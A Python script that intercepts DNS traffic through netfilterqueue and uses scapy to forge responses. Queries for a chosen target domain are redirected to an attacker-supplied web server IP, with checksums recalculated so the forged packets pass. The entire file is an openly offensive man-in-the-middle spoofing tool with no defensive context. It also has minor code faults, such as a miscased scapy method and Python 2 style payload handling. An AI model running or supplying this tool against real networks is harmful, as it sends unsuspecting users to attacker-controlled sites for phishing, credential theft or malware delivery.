#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# Optparse allows options in cli
import optparse

def c_arg():
	parser = optparse.OptionParser()
	parser.add_option("-t", "--target", dest="target", help="Target URL to dns spoof")
	parser.add_option("-a", "--attacker", dest="attacker", help="Attacker web server IP address")
	(options, arguments) = parser.parse_args()
	if not options.target:
		parser.error("[-] Please specify a target URL Address")
	elif not options.attacker:
		parser.error("[-] Please specify a attacker IP Address")
	return options


def process_packet(packet):
    options = c_arg()
    target = options.target
    attacker = options.attacker

    # Prints packet payload
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.hasLayer(scapy.DNSRR):
        print(scapy_packet.show())
        if scapy_packet[scapy.DNSQR].qname:

            # is question target ip we want to spoof?
            qname = scapy_packet[scapy.DNSQR].qname
            if target in qname:
                print("[+] Spoofing Target")

                # rrname tells person that they're at the right sight
                # rdata is ip of Attacker web server
                answer = scapy.DNSRR(rrname=qname, rdata=attacker)

                # spoof answer
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                # delete fields that stop us from spoofing packet
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

                # set payload to scapy_packet
                packet.set_payload(str(scapy_packet))

    # Drops the packet... cuts connection of target client
    # packet.drop()
    # Intercept incoming packets, modified them and accepted them instead of dropping them
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()